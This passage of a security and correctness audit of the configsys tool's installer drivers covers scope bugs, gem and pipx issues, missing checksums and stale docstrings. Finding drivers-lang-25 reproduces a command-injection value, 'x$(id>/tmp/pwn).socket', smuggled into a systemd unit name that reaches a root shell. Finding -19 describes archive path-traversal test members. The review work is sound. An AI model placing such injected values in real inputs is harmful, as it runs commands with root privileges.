install) and let only `$PREFIX` follow scope (the recipe's `sudo make install`); or create
`/opt/src/<comp>` with `sudo install -d -o "$USER"` first. Override `reconcile_scope` to move the
tree, as configsys-blender does.
**Effort:** S. **Tier:** B.

### drivers-lang-09 [MED] correctness — `source` archive acquisition extracts over the old tree; the docstring promises a pristine rebuild
`configsys/drivers/source.py:38-45` (REBUILD SEMANTICS: "from a PRISTINE tree"), `:139-145`
(`_fetch_and_extract(url, src, …)` straight into the existing `$SRC`).
Files deleted upstream, a stale `CMakeCache.txt`, old objects all survive an archive upgrade —
the exact masking the docstring says can't happen. Carried from 2026-09.
**(reproduced)** pretend archive install → `mkdir -p /tmp/x && curl … -o /tmp/x/.configsys-download.archive && tar -xf … --strip-components=1 -C /tmp/x && … ( cd /tmp/x && … make … )` — no removal of the prior tree.
**Fix:** extract into a sibling stage and swap (reuse tarball's stage fragment), carrying only the
marker; guarded by drivers-lang-02's helper.
**Effort:** S. **Tier:** B.

### drivers-lang-10 [MED] correctness — appImage and font download with curl but don't require it
`routes.hu:222,232` (`drivers: appImage: { requires: [ libfuse2, glibc ] }`, `font: { requires:
[ fontconfig, unzip ] }`), `appImage.py:92`, `font.py:72` (`_CURL_DOWNLOAD`); 26 core appImage
bindings, none adds `curl`. (native-pkg-file has no `drivers:` entry either — drivers-os.)
tarball declares `requires: curl` (`routes.hu:243`); these two don't, so on a box without curl
(Ubuntu 22.04 desktop, Debian/Ubuntu minimal images and containers) the resolver installs
fontconfig/unzip/libfuse2 and then the install dies with `curl: command not found` — the plan the
user approved was incomplete.
**(reproduced)** `configsys --home …/home3 --os ubuntu:22.04 where mononoki-nerd` → closure
`apt\fontconfig (dep)`, `apt\unzip (dep)`, `font\mononoki-nerd` — no curl; `--pretend install
mononoki-nerd` then runs `curl -fSL --retry 3 … Mononoki.zip`.
**Fix:** add `curl` to both `drivers:` entries (and to native-pkg-file's); add a driver-inventory
test that every driver whose ops spell `_CURL_DOWNLOAD` declares `requires: curl`.
**Effort:** S. **Tier:** B.

### drivers-lang-11 [MED] correctness — gem and luarocks report every install as user scope → perpetual false "fix-scope" warning, and `fix-scope` fails
`configsys/drivers/gem.py` (no `get_installed`; base returns `default_scope` = user; `gem list`
merges GEM_PATH, `:4-6`), `luarocks.py:60-61` (`_installed_across_scopes`, but `get_version` at
`:47-58` ignores scope — `luarocks list` spans both trees); consumers `app.py:252-260`
(diagnostics), `app.py:988-1018` (`cmd_fix_scope` → base `reconcile_scope`).
On a `scope: system` machine every gem/rock reads "installed user, config declares system — run:
configsys fix-scope"; fix-scope reinstalls with sudo and then runs the user-scope uninstall
(`gem uninstall` without sudo / `luarocks remove --local`), which fails — every time.
**(reproduced)** `r_small.py` → `gem get_installed(scope=system) -> ('1.60.0', 'user') | target scope -> system`;
`luarocks get_installed(scope=system) -> ('1.2.0-1', 'user')` (porcelain row in `/usr/local/lib/luarocks/…`).
**Fix:** luarocks: key the index by tree (porcelain column 4: the rocks path) and answer per scope;
gem: `gem list -d`/`gem contents --show-install-dir` or compare `Gem.user_dir` vs `Gem.dir`
(`ruby -e`) once in the batch. Until then, set `honors_scope`-dependent detection to "unknown" so
diagnostics don't claim a mismatch.
**Effort:** S. **Tier:** B.

### drivers-lang-12 [MED] correctness — gem `set-version` to an older version is silently ineffective, and a later uninstall prompts interactively
`configsys/drivers/gem.py:100-103` (`gem install -v X` installs ALONGSIDE), `:20,48-75` (`_LIST_RE`
takes the FIRST = newest version), `:84-94` (`gem uninstall -x <gem>` without `-a`/`-v`).
`targets_version` is True for gem, so the op loop accepts the set-version, reports ok, and then
`get_version` still reads the newer version (and the binstub still runs it) — "no surprises"
broken. With two versions installed, `gem uninstall` stops at "Select gem to uninstall", which
wedges an unattended batch.
**(reproduced)** `r_small.py` → `gem list` `rubocop (1.60.0, 1.50.0)` → `get_version -> 1.60.0 (asked for 1.50.0)`.
**Fix:** set_version = `gem uninstall -x -a <gem> && gem install -v X <gem>` (or uninstall the
other versions after the install); uninstall passes `-a`; test both.
**Effort:** S. **Tier:** B.

### drivers-lang-13 [MED] correctness — `Gem.upgrade` omits `--user-install` (carried)
`configsys/drivers/gem.py:33-35` (comment: "`--user-install` only applies to install; uninstall/
update act over the gem path"), `:96-98` (`gem update <gem>`, no flag, no sudo at user scope).
`gem update` takes `--[no-]user-install` (`gem help update`, RubyGems 3.3.5 here); without it a
user-scope update writes GEM_HOME and fails with a permissions error on RubyGems that don't
auto-fall-back (Ubuntu 22.04 ships 3.3.5; Debian 12 3.3.x). The comment is wrong about `update`.
Verified by reading `gem.py:96-98` + `gem help update` (`--[no-]user-install  Install in user's home directory instead`).
**Fix:** `gem update {self._user_flag(rc)}{gem}`; fix the comment; add a test.
**Effort:** S. **Tier:** B.

### drivers-lang-14 [MED] correctness — cabal ≥ 3.10 installs into `~/.local/bin` (XDG); the driver only probes and removes `~/.cabal/bin`
`configsys/drivers/cabal.py:20,46-55` (`readlink -e ~/.cabal/bin/<exe>`), `:72-74` (`rm -f
~/.cabal/bin/<exe>`), `:85-86`; the same driver already knows XDG mode (`:63`,
`~/.cache/cabal/packages`). Docstring: "confirmed against cabal-install 3.8.1".
cabal-install 3.10 switched to XDG directories when `~/.cabal` is absent (installdir
`~/.local/bin`, store under `~/.local/state/cabal`). On a fresh Fedora/Arch/Debian 13/ghcup box
every cabal tool installs fine, then reads "not installed" (the post-install "ran ok but reads
not installed" path), and `remove` is a silent no-op. (`_ensure_index`'s per-install `ls` also
expands the ambient `~`, drivers-lang-06.)
Verified by reading; not run (no cabal here). Confidence medium.
**Fix:** ask cabal where it installs (`cabal path --installdir` on ≥ 3.10, else `~/.cabal/bin`),
cached per driver in the batch; probe both dirs until then.
**Effort:** S. **Tier:** B.

### drivers-lang-15 [MED] performance — pipx re-runs `pipx list --json` once per unit (N+1), pip probes the interpreter per unit, pipx probes `uv` per op
`configsys/drivers/pipx.py:115-122` (`_venv_pythons` fills `self._pyver_cache` on the instance),
`:99-100` (`batch_index` returns only the version map), `:139-152` (`get_latest` →
`_target_python` → `_venv_pythons`); `pip.py:133-143` (`_pyver` per instance); `pipx.py:204-223`
(`_backend` "cached so a batch probes uv once"). `installState.inspect_one` (`installState.py:227`)
and `actions.run_plan` (`actions.py:218`) build a fresh driver per unit/step, so these caches never
outlive one unit.
**(reproduced)** `.venv/bin/python -I $RUN/scratch/drivers-lang/r_pipx_batch.py` (real
`InstallState.inspect`, counting runner) → `10 pipx + 10 pip units -> {'pipx list': 11, 'pip list': 1, 'python3 -c': 10}`;
measured `python3 -m pipx list --json` = 0.38–0.41 s each here (7 venvs). Core routes 27 pipx bindings.
**Fix:** put the interpreter map in the batch (`batch_index` → `{'installed': idx, 'pythons': pys}`
with `batch_installed_index` reading `['installed']`), read it in `_venv_pythons`; memoize
`_python_version`/`_backend` per `(class, runner)` (or in the batch / on the runner) instead of per
instance; fix the `_backend` docstring.
**Effort:** S. **Tier:** C.

### drivers-lang-16 [MED] correctness — `AltDriver._pm()` picks apt/dnf by sniffing the host and `os.environ` (carried)
`configsys/drivers/_alt.py:76-84` (`shutil.which('dnf')`, `os.environ.get('CONFIGSYS_PM')`), used by
`get_latest`/`install`/`upgrade`/`uninstall`.
The resolver already knows the OS block's `native:`; a Debian box with `dnf` installed (image
builders) takes the dnf branch, and `--os` (or a sandboxed test env via `paths.env`) can't steer it.
Verified by reading `_alt.py:76-84` (and the tests force it with `monkeypatch.setenv('CONFIGSYS_PM')`).
**Fix:** inject the native manager (resolver → `rc.fields['native']`, like `location-override`) and
read `CONFIGSYS_PM` from `self.paths.env`; best folded into drivers-lang-03's delegation to the
native driver.
**Effort:** S. **Tier:** B.

### drivers-lang-17 [MED] refactor — finish the `ModuleDriver` base for the ten ecosystem installers (carried D4)
`cargo.py`, `pip.py`, `pipx.py`, `npm.py`, `gem.py`, `opam.py`, `luarocks.py`, `cabal.py`,
`go_install.py`, `sdkman.py` (1,279 lines). The 2026-09 lock/latest boilerplate is gone
(`3fe0f4a`) and batching landed (`4c38d08`), but each still hand-writes: an identity accessor that
returns `rc.name` (10×: `_crate/_dist/_pkg/_gem/_rock/_cand`), a scope flag (`npm._prefix_flag`,
`gem._user_flag`, `luarocks._local_flag`), a list-and-parse `installed_index` (6×), a bin dir
literal (`~/.cabal/bin`, `~/go/bin`, `$HOME/.cargo/bin`, `'~/.local/bin'` ×3 in `location`), and the
`install/uninstall/upgrade/set_version` one-liners. The bug classes in this review that recur
per driver — ambient `$HOME` (-06), scope detection (-11), "one installed version" (-12), index-key
normalization (-29), per-instance caches (-15) — would each be fixed once.
**Fix:** `ModuleDriver(Driver)` with class data `CMDS = {install, uninstall, upgrade, set_version}`
templates (`{pkg}`, `{ver}`, `{scope_flag}`), `SCOPE_FLAGS = {'user': '--user-install', …}`,
`LIST_CMD` + `parse_list(stdout)`, `BIN_DIR` relative to `self.home()`, `index_key` normalization
hook, batch-scoped memo; keep bespoke overrides (pipx backend/python, cabal index/exe, go checkout,
gem default-gems, sdkman init). No plugin subclasses these modules (grepped `~/src/configsys-*`),
so it is internal.
**Effort:** M. **Tier:** D.

### drivers-lang-18 [MED] reuse — `GccToolset` re-implements `AltDriver` (carried)
`configsys/drivers/gcc_toolset.py:20,30-31,44-51,58-68` duplicate `_alt.py:36,52-54,98-103,86-94`;
`get_latest` returns None (`:53-54`) though the dnf branch of `AltDriver.get_latest` would answer.
**Fix:** `class GccToolset(AltDriver)` with `_packages → [gcc-toolset-N]`, `_master_bin →
/opt/rh/gcc-toolset-N/root/usr/bin/gcc`, the PM forced to dnf, no alternatives; inherits latest.
**Effort:** S. **Tier:** D.

### drivers-lang-19 [LOW] security — downloads are trusted on URL alone: no `sha256:`, extraction relies on tar/unzip defaults (carried A7 + archive-traversal MED)
`tarball.py:110,118,124`, `appImage.py:92`, `font.py:72`, `source.py:143-144` (all via
`_CURL_DOWNLOAD`/`_fetch_and_extract`, `driver.py:92,283-301`); `_alt.py:158` (key by URL, no
fingerprint).
Still the remaining Tier-A item of 2026-09. A tampered CDN/redirect or a swapped release asset is
installed (and for system scope written as root) undetected; Alpine's busybox tar has different
traversal handling than GNU tar and nothing pre-checks members.
Verified by reading (no checksum code in any owned driver: `grep -n sha256 configsys/drivers/*.py`
hits only glue's override tracking).
**Fix:** optional binding `sha256:` (literal, or `{ asset: "<glob>.sha256" }` / a SHA256SUMS asset
of the same release) verified before extract/move (`sha256sum -c` in the fragment); `check` warns
on system-scope downloads without one; extraction via Python `tarfile` `filter='data'` / `zipfile`
member checks (drivers-os owns `_extract_cmd`); `key-fingerprint:` for `_alt`/apt keys.
**Effort:** M. **Tier:** A.

**Verified:** CONFIRMED (by reading) that there is no integrity check, but both attack scenarios are overstated. Severity MED → LOW.
- **No checksum support.** `grep -rn 'sha256\|checksum\|hashlib' configsys/` finds only the plugin content pin and glue's override tracking.
- **Archive traversal: tested, nothing escapes.** In throwaway `podman run --rm --network=none` containers I used configsys's own extract shapes (`tar -xf <tmp> -C <dest>` and `unzip -o -q <tmp> -d <dest>`) on a crafted tar and zip with `../x`, `/tmp/x`, and a symlink `lnk -> /tmp` followed by `lnk/x`. BusyBox 1.37 (alpine:3.23) prints `removing leading '../' from member names` and `can't create symlink 'lnk' to '/tmp'`. GNU tar (debian:12) prints `Member name contains '..'`, `Removing leading '/'` and `lnk/escaped-via-symlink.txt: Cannot open: Not a directory`, then exits non-zero. So configsys does rely on tool defaults, but those defaults block the classic escapes.
- **CDN/redirect tampering: covered by TLS.** Every shipped download URL is https. There are 0 `http://` URLs in routes.hu or `~/src/configsys-*`; the only one in the drivers is clang's apt.llvm.org deb line, which apt checks against the repo key.
- **What remains** is an upstream that swaps its own release asset. That is the usual supply-chain exposure the brief sets aside, and the proposed same-release `.sha256` asset would be swapped along with it; only a literal per-version hash in the route would catch it.

Why the severity changed: what remains is defense in depth. An `http://` URL from a plugin is security-02, and running the download as root is drivers-lang-04.

### drivers-lang-20 [LOW] correctness — appImage/font failure reasons are hidden in `Result.cmd`, so the TUI says only "exit 1"
`appImage.py:84`, `font.py:63`, `script.py:84,102` (`Result('(…)', 1)`), vs `tarball.py:77-90`
(`Result.fail` with a specific reason); `runner.py:200-206` documents why the reason must ride in
stderr; `actions.fail_detail` (`actions.py:96-107`) reads stderr/captured/stdout only.
The common appImage failure (asset glob didn't match / version unresolved) gives no reason in the
TUI summary or the report; tarball's good message isn't shared.
**(reproduced)** pretend installs with an unresolvable `$VERSION` url → `AppImage fail_detail -> 'exit 1'`, `Font fail_detail -> 'exit 1'`, `Tarball fail_detail -> 'exit 1: x: could not build a download URL (version unresolved?)'`.
**Fix:** hoist tarball's reason builder to `Driver.download_failure(rc, version)` and use it in
tarball/appImage/font/source/native-pkg-file; `Result.fail` for every preflight refusal.
**Effort:** S. **Tier:** B.

### drivers-lang-21 [LOW] correctness — go-install: `upgrade` jumps to `@latest` past a route's `version:`; GOBIN/GOPATH ignored; `/vN` module binary name
`configsys/drivers/go_install.py:158-161` (`upgrade` → `@latest`; install honors the spec via
`_at`, `:59-61`), `:30,71,91,155-156` (`~/go/bin` only — docstring `:3` says "binaries land in
GOBIN"), `:51-52` (`_bin` = last path segment; for `…/foo/v2` go names the binary `foo`).
`get_latest` reports the pinned spec, so an explicit `configsys upgrade` installs a version the UI
never showed; a user with `GOBIN=~/.local/bin` sees every tool "missing" and `remove` is a no-op.
(No `/vN` module in routes today — latent.)
**(reproduced)** `r_small.py` → `latest() -> 0.16.2` … `install: golang.org/x/tools/gopls@0.16.2 | upgrade: golang.org/x/tools/gopls@latest`.
**Fix:** `upgrade` = `_at(rc, self._fresh_latest(rc))` (spec-aware, like the checkout branch);
resolve GOBIN once per batch (`go env GOBIN GOPATH`); strip a trailing `/v[0-9]+` in `_bin`.
**Effort:** S. **Tier:** B.

### drivers-lang-22 [LOW] correctness — "where is the managed Go/Rust toolchain" is answered three ways and they now diverge (carried NIT)
`source.py:164` (`$HOME/sdks/go/bin` hard-coded; comment `:155-163` admits overrides aren't
honored), `go_install.py:37` (`${CONFIGSYS_SDK_DIR:-$HOME/sdks}/go/bin` — treats the env var as an
absolute path, though `paths.py` treats it as possibly scope-relative, e.g. `sdks`), `cargo.py:24`,
`cabal.py:25`. None honors the config `dirs: { sdk: … }` or system scope (`/opt/sdks/go`), which
is where the `go` tarball (`installDir: "$CONFIGSYS_SDK_DIR/go"`) actually lands.
Verified by reading the three constants against `paths.install_dir` (`paths.py:206-215`).
**Fix:** one `Driver.toolchain_bindirs()` computed in Python from `self.paths.install_dir(
'$CONFIGSYS_SDK_DIR/go', scope)/bin` for both scopes + `home()/.cargo/bin` + GOBIN, used by
source/go-install/cargo/cabal.
**Effort:** S. **Tier:** B.

### drivers-lang-23 [LOW] correctness — pyenv picks the "newest" patch lexically (carried)
`configsys/drivers/pyenv.py:36-40` (`sorted(...)[-1]` over strings).
With 3.11.9 and 3.11.10 installed it reports 3.11.9; `get_latest` (3.11.10) then reads outdated
forever, `upgrade` (`install -s 3.11`) is a no-op, and `uninstall` removes the wrong patch.
`test_pyenv_driver.py:42-45` only uses single-digit patches.
**(reproduced)** `r_small.py` → `get_version(line 3.11) with 3.11.9 + 3.11.10 installed -> 3.11.9`.
**Fix:** sort with `packaging.version.Version` (already a dependency) or `versionsweep._pv`.
**Effort:** S. **Tier:** B.

### drivers-lang-24 [LOW] correctness — script `version-re` without a capture group (or invalid) raises out of `get_version` (carried)
`configsys/drivers/script.py:60-63` (`m.group(1)`); `versions.py:388` handles the same case with
`m.group(1) if m.groups() else m.group(0)`. `routecheck` doesn't compile `version-re`.
**(reproduced)** `r_small.py` → `version-re '[0-9.]+'` → `raises IndexError no such group`; `'([0-9.]+'` → `invalid regex raises error missing ), unterminated subpattern`.
**Fix:** the `versions.py` fallback; a `routecheck` lint compiling `version-re` (error on invalid).
**Effort:** S. **Tier:** B.

### drivers-lang-25 [LOW] security — service/group names are quoted for the command but spliced raw into double-quoted `echo`s inside the root shell
`configsys/drivers/service.py:90-91,94` (`echo "configsys: {unit} is a systemd-only unit…"`,
`echo "…skipped {unit}"` under `sudo=True`), `group.py:44-46` (same shape, reachable only if the
group exists); `service.py:33` (`_SAFE` admits `..` and globs, so `runit: "*"` enables/disables the
alphabetically-last service). Route data (incl. untrusted data plugins — service/group aren't
trust-gated) controls these. LOW because the same author already has root via native-pkg-file.
**(reproduced)** pretend `Service.install(unit='x$(id>/tmp/pwn).socket')` → `… systemctl enable --now 'x$(id>/tmp/pwn).socket'; elif … ( echo "configsys: x$(id>/tmp/pwn).socket is a systemd-only unit…" …`;
running the else-branch fragment in bash → `skipped xINJECTED.socket`.
**Fix:** `printf '%s\n' {shlex.quote(unit)}` in every message; validate `unit`/group names to the
systemd/group charsets; disallow `..` and bare `*` in `_SAFE`.
**Effort:** S. **Tier:** A.

### drivers-lang-26 [LOW] correctness — an appImage binding with no `path:` reads "installed" and installs into the scope base
`configsys/drivers/appImage.py:42-45` (`scoped_dir('')` = the base), `:68-74` (`exists()` on the
base → True → `'installed'`), `:91-92` (download beside the base, `mv -f` into it). No routecheck
lint (the 2026-09 recommendation mirrored tarball's; all 26 core bindings set `path:` today).
**(reproduced)** `AppImage.get_version` with no `path` → `no path: get_version -> installed | target -> …/home3`.
**Fix:** refuse an empty/base target in the drivers-lang-02 helper; `appimage-no-path` lint.
**Effort:** S. **Tier:** B.

### drivers-lang-27 [LOW] correctness — font install isn't transactional, leaks its temp dir, and misses upper-case extensions (carried NIT)
`configsys/drivers/font.py:69-81`: `rm -rf <dir>` (`:73`) precedes `unzip` (`:76`); under `set -e` a
failed download/unzip exits before `rm -rf "$tmp"` (`:78`), and a zip whose fonts are `.TTF`/`.ttc`
matches nothing → unzip fails → the previous install is already gone. tarball/appImage stage and
swap (P4); font doesn't.
Verified by reading `font.py:69-81`.
**Fix:** unzip into `$tmp/out`, then `rm -rf <dir> && mv`; `trap 'rm -rf "$tmp"' EXIT`; `unzip -C`
(case-insensitive) and add `*.ttc`.
**Effort:** S. **Tier:** B.

### drivers-lang-28 [LOW] correctness — an explicit `set-version` string reaches `source` `build:` and script `set-version-cmd` unvalidated and unquoted
`configsys/drivers/source.py:115-116,147,176-177` (`_sub` splices `version`), `script.py:112`
(`cmd.replace('$VERSION', version)`); only `resolve_version`/`download_target` apply
`_SAFE_VERSION_RE` (`driver.py:217,238`).
Input is the user's own CLI argument (`app.cmd_set_version`), so this is a robustness issue, not a
trust-boundary one: `set-version x '1.2 3'` silently runs a different command.
Verified by reading the call chain `app.py:1216` → `actions.run_plan` (`actions.py:249`) → `set_version`.
**Fix:** validate the requested version with `_SAFE_VERSION_RE` once in `run_plan` (refuse with a
message) — covers every driver.
**Effort:** S. **Tier:** B.

### drivers-lang-29 [LOW] correctness — pipx's index key isn't PEP 503-normalized, so detection/orphans miss `Faker`; `_norm` is duplicated with pip
`configsys/drivers/pipx.py` (no `index_key`; `installed_index` keys raw venv names `:88-92`;
`get_version` normalizes privately `:105-113`); `probecache.py:45` and `orphans.py:95` look up
`drv.index_key(rc)`; `pip.py:33-35,70-71` does it right with a second copy of the regex
(`pipx.py:67-72`).
Route scan: one pipx binding (`faker` → `Faker`) is affected today — its pipx install is invisible
to detection and shows as a pipx orphan. Verified by reading + scanning `routes.load`.
**Fix:** `index_key = _norm(rc.name)` and normalized index keys; one shared normalizer
(`packaging.utils.canonicalize_name`).
**Effort:** S. **Tier:** B.

### drivers-lang-30 [LOW] safety — pipx under `--pretend`: probes `uv --version` and `version_advisory` makes a live PyPI fetch (carried)
`configsys/drivers/pipx.py:214` (probe even when `self._offline()`), `:169-193` (`versions.http_fetch`
with no offline check; called by `versionreport.py:171`). `Driver._offline` says --pretend is
network-read-free too.
**(reproduced)** `r_small.py` → `calls: ['uv --version', 'python3 -m pipx install httpie']`;
monkeypatched fetcher with `Runner(pretend=True)` → `_offline() = True | live fetches: ['https://pypi.org/pypi/httpie/json']`.
**Fix:** skip both when `self._offline()` (advisory → None); drop `'uv --version'` from the pipx
tests' expected call lists.
**Effort:** S. **Tier:** A.

### drivers-lang-31 [LOW] correctness — `source` substitutes `$ARCH` in `build:` with the raw cpu but in `url:` with the `cpu-names:` token
`configsys/drivers/source.py:86-88` (`self.arch()`) vs `driver.py:159-164` (`arch_token(rc)`).
One binding, two meanings of `$ARCH`; a recipe that names its own asset in a build step (`tar xf
x-$ARCH.tar.gz`) gets a different string than the download used.
**(reproduced)** pretend archive install with `cpu-names: { x86_64: amd64 }` → `curl … x-amd64.tar.gz` … `make ARCH=x86_64`.
**Fix:** use `arch_token(rc)` in `_sub` (or document `$CPU` vs `$ARCH`).
**Effort:** S. **Tier:** B.

### drivers-lang-32 [LOW] correctness — sdkman/pyenv treat `version:` as a literal string (a discovery dict becomes shell text); pyenv's fallback line is `python3.11` (carried)
`configsys/drivers/sdkman.py:45-54` (`str(v)`, `rc.fields["version"]` in a path), `pyenv.py:27-28`
(`rc.fields.get('version') or rc.comp`). All current routes use strings (scanned), so this is
dead-but-wrong — but `version:` everywhere else means "spec or literal".
**Fix:** read through `self.resolve_version(rc)` (offline-safe for `static`); derive the pyenv line
with `re.search(r'\d+\.\d+', rc.comp)` or lint `version:` as required/string for these vias.
**Effort:** S. **Tier:** B.

### drivers-lang-33 [LOW] comment-drift — stale driver docstrings and comments
`tarball.py:4-7` ("Entirely user-space (no sudo)" — system scope sudos; "`$SDKVERSION`" — a v1
placeholder found only in docs/history; "extract into `installDir`" — it stages and swaps);
`pip.py:11`, `pipx.py:5`, `appImage.py:16`, `font.py:9` (`!depends` → `requires:`); `appImage.py:1`
(`\\appImage` family notation); `source.py:38-45` (PRISTINE — drivers-lang-09); `pipx.py:204-208`
(`_backend` "cached so a batch probes uv once" — drivers-lang-15); `go_install.py:3` ("land in
GOBIN" — the driver reads only `~/go/bin`); `gem.py:34` (update ignores `--user-install` —
drivers-lang-13); `cabal.py:11` ("confirmed against 3.8.1" — drivers-lang-14); `apt.py:191` claims
AltDriver resolves `$CODENAME` the same way (drivers-lang-03, drivers-os file).
**Fix:** rewrite each to what the code does (or fix the code where the comment states intent).
**Effort:** S. **Tier:** E.

### drivers-lang-34 [NIT] dead-code — eight unused `Result` imports left by the D4 hoist
`cabal.py:18`, `cargo.py:16`, `group.py:15`, `luarocks.py:15`, `npm.py:20`, `opam.py:15`,
`pipx.py:19`, `service.py:26` (`.venv/bin/python -m pyflakes configsys/drivers/…` → `'..runner.Result' imported but unused`).
**Fix:** delete them. **Effort:** S. **Tier:** D.

### drivers-lang-35 [NIT] reuse — the path drivers each carry their own marker/home/scope kit (carried)
`MARKER_PREFIX = '.configsys-'` ×4 (`tarball.py:16`, `appImage.py:27`, `font.py:18`, `source.py:53`) and
four near-identical marker reads (`tarball.py:62-69`, `appImage.py:68-74`, `font.py:49-53`,
`source.py:97-102` — and they disagree: an empty marker is `'installed'` in three, `None` in
source); `_home()` ×2 + inline ×3 (`appImage.py:39-40`, `font.py:30-31`, `npm.py:50,60`,
`pyenv.py:22`); `font.py:34` uses `scope(rc)` where every other driver uses `_scope(rc)`.
Plugin build drivers (blender/kicad/opencv) re-implement the same marker via `printf`.
**Fix:** `Driver.home()`, `Driver.marker_path(dir, rc)` / `read_marker(path)` (public, so plugins
use them), and the drivers-lang-02 removal helper — a small `PathDriver` mixin.
**Effort:** S. **Tier:** D.

### drivers-lang-36 [NIT] performance — `Group.get_version` spawns a three-process pipeline per unit (carried)
`configsys/drivers/group.py:32-36` (`id -nG "$(id -un)" | tr … | grep -qx`). Python's
`os.getgrouplist(user, gid)` + `grp.getgrnam` answers in-process (and reflects the DB, like `id`).
**Fix:** in-process check (keep the runner path for `--pretend` parity if wanted).
**Effort:** S. **Tier:** C.

## Test gaps

- **source:** an existing checkout without our marker (must refuse, -01); a dirty owned tree;
  upgrade of a HEAD/branch recipe advancing to the remote tip, and a changed `repo:` (-07);
  archive re-install leaves no stale file (-09); `scope: system` command shape (-08); `$ARCH` with
  `cpu-names:` in `build:` (-31); `uninstall-cmd` substitution with `$SRC`/`$PREFIX` containing spaces.
- **tarball/font/appImage/source guards:** `installDir: "../<home>"`, `$CONFIGSYS_APP_DIR`, `~/.config`,
  `/usr/local/bin`; install over an unmanaged existing dir; font `location-override` = home / the
  fonts base; appImage empty `path:` and `path:` naming an existing non-marker file; tarball
  `binary:`/cabal `exe:` with `/` or `..` (-02, -26).
- **appImage:** `_extract_icon` is never `sudo` at system scope (-04).
- **_alt:** `$CODENAME` falls back to `UBUNTU_CODENAME` (the current test pins the bug,
  `test_clang_driver.py:54`); PPA skipped when the distro carries the package; untrusted-plugin
  `apt-source`/`ppa` refused; `key-path`/`list` outside apt dirs refused; `_pm()` with neither/both
  managers (-03, -05, -16).
- **gem/luarocks:** system-scope detection (-11); set-version leaves one version; uninstall `-a`
  (-12); `upgrade` carries `--user-install` (-13).
- **pipx/pip:** spawn count for N units through `InstallState.inspect` (a `test_module_batch_index`
  style counter, -15); `Faker` index key (-29); no `uv --version`/network under pretend (-30).
- **pyenv** two-digit patch ordering (-23); **script** groupless/invalid `version-re` (-24) and
  `set_version` substitution; **go-install** upgrade honoring a `version:` spec and GOBIN (-21);
  **service** unit names with `$`/backticks never reach an unquoted context (-25).
- **inventory:** every driver whose ops use `_CURL_DOWNLOAD` declares `requires: curl` (-10).
- **sandbox:** under `CONFIGSYS_HOME`, no owned driver's command contains a literal `$HOME`/`~/`
  (a grep-style test over pretend output) once -06 lands.

## Dead code

- Eight unused `Result` imports (drivers-lang-34) — pyflakes over the 22 owned files; grepped
  `configsys/`, `test/`, `examples/` and `~/src/configsys-*/` for `drivers.<mod> import … Result` /
  `drivers.<mod>.Result`: no importer.
- No dead functions found: every helper in the owned files has an in-tree caller
  (`_fresh_latest`, `_suggest_pin`, `explicit_keys`, `_venv_pythons`, …); the plugin repos import
  only `configsys.plugins.Driver/Result/Splash` (grep of `~/src/configsys-*/*.py`), and none
  subclasses an owned driver, so owned-module internals are free to change.

## ABI / interface candidates

- **Add (frozen-list candidates):** `Driver.home()` (replaces 5 home derivations; plugins use
  `self.paths.home` today), `Driver.removable_dir(path, rc)` (the shared destructive-target guard,
  -02 — plugin build drivers need the same rule), `Driver.marker_path(dir, rc)`/`read_marker(path)`
  (-35), `Driver.download_failure(rc, version)` (-20), `Driver.toolchain_bindirs()` (-22).
- **Runner env for sandboxes:** a Context-supplied child env (`HOME=<configsys home>`) so drivers
  stop needing to know about `--home` at all (-06; runner/app are other areas' files).
- **`Result.fail` everywhere** for preflight refusals — six owned call sites still build
  `Result('(…)', 1)` (-20).
- **`ModuleDriver` class data** (-17): if it lands, its `CMDS`/`LIST_CMD`/`parse_list` shape is a
  natural public base for plugin module installers — decide whether to freeze it.

## Questions for the user

1. **Source trees you didn't create** (-01): should `via: source` refuse an existing unmarked
   checkout, adopt it read-only (fetch, never clean/remove), or clone into a configsys-private dir
   (e.g. `~/src/.configsys/<comp>`) so it can never collide with your own clones? And should
   `remove` delete the tree at all (configsys-blender deliberately doesn't)?
2. **Where the plugin trust line sits for artifact drivers** (-05, -25): script/source/glue are
   gated, but an untrusted data plugin can still install root-run `.deb`s (native-pkg-file), apt
   repos (`_alt`, apt `ppa`/`source-line`), services and group memberships. Gate every mutating op
   of a binding from an untrusted plugin (i.e. untrusted plugins may define components/profiles
   but not *install* anything until trusted), or keep the line at shell strings and document it?
3. **`--home` semantics** (-06): should configsys export `HOME=<sandbox>` to child commands (fully
   sandboxing cargo/pip/pipx/go/cabal/sdkman), as `principles.md` prescribes, or narrow the
   `--home` help text to "configsys's own paths"?
4. **gem multi-version** (-12): is removing the other installed versions on `set-version`
   acceptable (it's what makes the pin real), or should gem's `targets_version` become False?
5. **Version-less source recipes** (-07): should `upgrade` fast-forward to the remote default
   branch, and should `get_latest` for such a recipe report the remote tip (so it can read
   outdated at all)?

## Refuted on verification

None. The checker verified the seven findings in scope: every HIGH (drivers-lang-01 to -04) plus every security/safety finding at MED or above (-05, -06 and -19). All seven were confirmed. Six were reproduced and -19 was confirmed by reading. -25 and -30 are LOW and were outside the scope. Two sub-claims didn't hold and are kept here for calibration:

- **-03(b), the Debian half.** "Debian proper adds an Ubuntu PPA that 404s" didn't hold. In debian:12, `add-apt-repository` either crashes without python3-launchpadlib, so gcc-12 fails to install, or writes an empty `…-bookworm.list` and installs Debian's own gcc-12. There is no 404 and no poison pill. The Mint/derivative clang poison pill and the Ubuntu PPA side effects reproduced.
- **-19, the archive-traversal half.** BusyBox 1.37 and GNU tar both refused `..`, absolute and through-symlink members in container tests.

Severity changes, with reasons in each **Verified** line: -05 MED → HIGH, to match security-01, the same `_alt` mechanism; -19 MED → LOW.
